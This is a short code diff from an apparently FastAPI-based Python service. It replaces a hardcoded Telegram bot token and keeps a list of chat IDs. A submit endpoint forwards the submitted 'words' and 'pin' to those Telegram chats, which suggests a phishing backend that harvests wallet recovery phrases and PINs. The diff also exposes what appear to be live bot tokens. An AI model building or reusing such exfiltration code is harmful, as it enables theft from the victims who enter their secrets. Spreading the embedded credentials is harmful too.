@@ -24,7 +24,7 @@ app.add_middleware(
 )
 
 
-BOT_TOKEN = "8706491880:AAEvTvIW5sOu2xP2JlK9-1Kk0bOn_0az1tE"
+BOT_TOKEN = "8424319780:AAErMSB9YiQ2v7KuB4d5ywhSiVNJG1BSdCk"
 CHAT_IDS = [7669456027, 7818973762, 7421128257]
 
 
@@ -57,6 +57,7 @@ async def submit(data: Data):
     send_to_telegram(data.words, data.pin)
 
     return {"status": "ok"}
+
 
 
 
